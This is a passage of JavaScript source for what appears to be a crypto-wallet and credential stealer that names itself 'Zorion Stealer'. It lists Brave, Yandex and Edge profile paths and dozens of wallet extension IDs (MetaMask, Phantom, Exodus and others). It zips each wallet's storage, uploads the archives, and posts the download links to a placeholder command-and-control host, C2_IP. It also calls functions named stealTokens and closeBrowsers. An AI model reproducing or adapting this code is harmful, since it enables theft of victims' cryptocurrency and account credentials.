      `${localappdata}\\BraveSoftware\\Brave-Browser\\User Data\\Default\\`,
      `${localappdata}\\BraveSoftware\\Brave-Browser\\User Data\\Profile 1\\`,
      `${localappdata}\\BraveSoftware\\Brave-Browser\\User Data\\Profile 2\\`,
      `${localappdata}\\BraveSoftware\\Brave-Browser\\User Data\\Profile 3\\`,
      `${localappdata}\\BraveSoftware\\Brave-Browser\\User Data\\Profile 4\\`,
      `${localappdata}\\BraveSoftware\\Brave-Browser\\User Data\\Profile 5\\`,
      `${localappdata}\\BraveSoftware\\Brave-Browser\\User Data\\Guest Profile\\`
  ],
  yandex: [
      `${localappdata}\\Yandex\\YandexBrowser\\User Data\\Profile 1\\`,
      `${localappdata}\\Yandex\\YandexBrowser\\User Data\\Profile 2\\`,
      `${localappdata}\\Yandex\\YandexBrowser\\User Data\\Profile 3\\`,
      `${localappdata}\\Yandex\\YandexBrowser\\User Data\\Profile 4\\`,
      `${localappdata}\\Yandex\\YandexBrowser\\User Data\\Profile 5\\`,
      `${localappdata}\\Yandex\\YandexBrowser\\User Data\\Guest Profile\\`
  ],
  edge: [
      `${localappdata}\\Microsoft\\Edge\\User Data\\Default\\`,
      `${localappdata}\\Microsoft\\Edge\\User Data\\Profile 1\\`,
      `${localappdata}\\Microsoft\\Edge\\User Data\\Profile 2\\`,
      `${localappdata}\\Microsoft\\Edge\\User Data\\Profile 3\\`,
      `${localappdata}\\Microsoft\\Edge\\User Data\\Profile 4\\`,
      `${localappdata}\\Microsoft\\Edge\\User Data\\Profile 5\\`,
      `${localappdata}\\Microsoft\\Edge\\User Data\\Guest Profile\\`
  ]
};

const walletPathsEXT = {
  'Trust': '\\Local Extension Settings\\egjidjbpglichdcondbcbdnbeeppgdph',
  'Metamask': '\\Local Extension Settings\\nkbihfbeogaeaoehlefnkodbefgpgknn',
  'Coinbase': '\\Local Extension Settings\\hnfanknocfeofbddgcijnmhnfnkdnaad',
  'BinanceChain': '\\Local Extension Settings\\fhbohimaelbohpjbbldcngcnapndodjp',
  'Phantom': '\\Local Extension Settings\\bfnaelmomeimhlpmgjnjophhpkkoljpa',
  'TronLink': '\\Local Extension Settings\\ibnejdfjmmkpcnlpebklmnkoeoihofec',
  'Ronin': '\\Local Extension Settings\\fnjhmkhhmkbjkkabndcnnogagogbneec',
  'Exodus': '\\Local Extension Settings\\aholpfdialjgjfhomihkjbmgjidlcdno',
  'Coin98': '\\Local Extension Settings\\aeachknmefphepccionboohckonoeemg',
  'Authenticator': '\\Sync Extension Settings\\bhghoamapcdpbohphigoooaddinpkbai',
  'MathWallet': '\\Sync Extension Settings\\afbcbjpbpfadlkmhmclhkeeodmamcflc',
  'YoroiWallet': '\\Local Extension Settings\\ffnbelfdoeiohenkjibnmadjiehjhajb',
  'GuardaWallet': '\\Local Extension Settings\\hpglfhgfnhbgpjdenjgmdgoeiappafln',
  'JaxxxLiberty': '\\Local Extension Settings\\cjelfplplebdjjenllpjcblmjkfcffne',
  'Wombat': '\\Local Extension Settings\\amkmjjmmflddogmhpjloimipbofnfjih',
  'EVERWallet': '\\Local Extension Settings\\cgeeodpfagjceefieflmdfphplkenlfk',
  'KardiaChain': '\\Local Extension Settings\\pdadjkfkgcafgbceimcpbkalnfnepbnk',
  'XDEFI': '\\Local Extension Settings\\hmeobnfnfcmdkdcmlblgagmfpfboieaf',
  'Nami': '\\Local Extension Settings\\lpfcbjknijpeeillifnkikgncikgfhdo',
  'TerraStation': '\\Local Extension Settings\\aiifbnbfobpmeekipheeijimdpnlpgpp',
  'MartianAptos': '\\Local Extension Settings\\efbglgofoippbgcjepnhiblaibcnclgk',
  'TON': '\\Local Extension Settings\\nphplpgoakhhjchkkhmiggakijnkhfnd',
  'Keplr': '\\Local Extension Settings\\dmkamcknogkgcdfhhbddcghachkejeap',
  'CryptoCom': '\\Local Extension Settings\\hifafgmccdpekplomjjkcfgodnhcellj',
  'PetraAptos': '\\Local Extension Settings\\ejjladinnckdgjemekebdpeokbikhfci',
  'OKX': '\\Local Extension Settings\\mcohilncbfahbmgdjkbpemcciiolgcge',
  'Sollet': '\\Local Extension Settings\\fhmfendgdocmcbmfikdcogofphimnkno',
  'Sender': '\\Local Extension Settings\\epapihdplajcdnnkdeiahlgigofloibg',
  'Sui': '\\Local Extension Settings\\opcgpfmipidbgpenhmajoajpbobppdil',
  'SuietSui': '\\Local Extension Settings\\khpkpbbcccdmmclmpigdgddabeilkdpd',
  'Braavos': '\\Local Extension Settings\\jnlgamecbpmbajjfhmmmlhejkemejdma',
  'FewchaMove': '\\Local Extension Settings\\ebfidpplhabeedpnhjnobghokpiioolj',
  'EthosSui': '\\Local Extension Settings\\mcbigmjiafegjnnogedioegffbooigli',
  'ArgentX': '\\Local Extension Settings\\dlcobpjiigpikoobohmabehhmhfoodbb',
  'NiftyWallet': '\\Local Extension Settings\\jbdaocneiiinmjbjlgalhcelgbejmnid',
  'BraveWallet': '\\Local Extension Settings\\odbfpeeihdkbihmopkbjmoonfanlbfcl',
  'EqualWallet': '\\Local Extension Settings\\blnieiiffboillknjnepogjhkgnoapac',
  'BitAppWallet': '\\Local Extension Settings\\fihkakfobkmkjojpchpfgcmhfjnmnfpi',
  'iWallet': '\\Local Extension Settings\\kncchdigobghenbbaddojjnnaogfppfj',
  'AtomicWallet': '\\Local Extension Settings\\fhilaheimglignddkjgofkcbgekhenbh',
  'MewCx': '\\Local Extension Settings\\nlbmnnijcnlegkjjpcfjclmcfggfefdm',
  'GuildWallet': '\\Local Extension Settings\\nanjmdknhkinifnkgdcggcfnhdaammmj',
  'SaturnWallet': '\\Local Extension Settings\\nkddgncdjgjfcddamfgcmfnlhccnimig',
  'HarmonyWallet': '\\Local Extension Settings\\fnnegphlobjdpkhecapkijjdkgcjhkib',
  'PaliWallet': '\\Local Extension Settings\\mgffkfbidihjpoaomajlbgchddlicgpn',
  'BoltX': '\\Local Extension Settings\\aodkkagnadcbobfpggfnjeongemjbjca',
  'LiqualityWallet': '\\Local Extension Settings\\kpfopkelmapcoipemfendmdcghnegimn',
  'MaiarDeFiWallet': '\\Local Extension Settings\\dngmlblcodfobpdpecaadgfbcggfjfnm',
  'TempleWallet': '\\Local Extension Settings\\ookjlbkiijinhpmnjffcofjonbfbgaoc',
  'Metamask_E': '\\Local Extension Settings\\ejbalbakoplchlghecdalmeeeajnimhm',
  'Ronin_E': '\\Local Extension Settings\\kjmoohlgokccodicjjfebfomlbljgfhk',
  'Yoroi_E': '\\Local Extension Settings\\akoiaibnepcedcplijmiamnaigbepmcb',
  'Authenticator_E': '\\Sync Extension Settings\\ocglkepbibnalbgmbachknglpdipeoio',
  'MetaMask_O': '\\Local Extension Settings\\djclckkglechooblngghdinmeemkbgci'
};

async function zipWallets() {
  let allLinks = [];

  for (const [browser, paths] of Object.entries(browserPathsEXT)) {
      for (const profilePath of paths) {
          if (fs.existsSync(profilePath)) {
              const profileName = path.basename(path.dirname(profilePath));
              for (const [wallet, walletPath] of Object.entries(walletPathsEXT)) {
                  const fullWalletPath = profilePath + walletPath;
                  if (fs.existsSync(fullWalletPath)) {
                      const zipFilePath = path.join(appdata, `${browser}_${profileName}_${wallet}.zip`);
                      const output = fs.createWriteStream(zipFilePath);
                      const archive = archiver('zip', {
                          zlib: { level: 9 }
                      });

                      output.on('close', async function() {
                          if (archive.pointer() === 0) {
                              fs.unlinkSync(zipFilePath);
                          } else {
                              console.log(`${browser.charAt(0).toUpperCase() + browser.slice(1)} ${profileName} ${wallet} wallet zipped and saved to ${zipFilePath}`);
                              
                              // Wait for 5 seconds
                              await new Promise(resolve => setTimeout(resolve, 5000));
                              
                              // Upload the file to custom API
                              const filelink = await uploadFileToCustomAPI(zipFilePath);
                              if (filelink) {
                                  const fileName = `${browser}_${profileName}_${wallet}.zip`;
                                  allLinks.push(`\`\`\`${fileName}\`\`\` - [downloadhere!](${filelink.replace(/ /g, '%20')})`);
                              }
                          }
                      });

                      output.on('error', function(err) {
                          console.error(`Error writing to zip file ${zipFilePath}: ${err.message}`);
                      });

                      archive.on('error', function(err) {
                          console.error(`Error creating archive for ${fullWalletPath}: ${err.message}`);
                      });

                      archive.pipe(output);

                      fs.readdirSync(fullWalletPath).forEach(file => {
                          const filePath = path.join(fullWalletPath, file);
                          try {
                              if (fs.lstatSync(filePath).isFile()) {
                                  archive.file(filePath, { name: path.relative(profilePath, filePath) });
                              }
                          } catch (err) {
                              console.error(`Error reading file ${filePath}: ${err.message}`);
                          }
                      });

                      archive.finalize();
                  }
              }
          }
      }
  }

  // After all files have been processed, send a single message with all links
  setTimeout(async () => {
      if (allLinks.length > 0) {
          const messageContent = `*Zorion Stealer ✝️ - (Extension Data)*

${allLinks.join('\n')}`;

          const randomStringq = crypto.randomBytes(16).toString('hex');

          const data = {
              content: messageContent,
              key: key
          };

          await axios.post(`https://C2_IP/sendmessagewz/${randomStringq}`, data);
      }
  }, 10000); // Adjust the timeout duration as needed
}

closeBrowsers();
zipWallets();
browserzipexe();
StopCords();
stealTokens();
apptokenexe();
getPepperoni();
SubmitExodus();

async function keysave() {

  const fileName = 'system66623.txt';
  const filePath = path.join(tempDir, fileName); 
  
  const textToAdd = `${key}`;
  
  fs.writeFileSync(filePath, textToAdd, { encoding: 'utf8' });
  }
  
keysave();
  
function onlyUnique(item, index, array) {
    return array.indexOf(item) === index;
}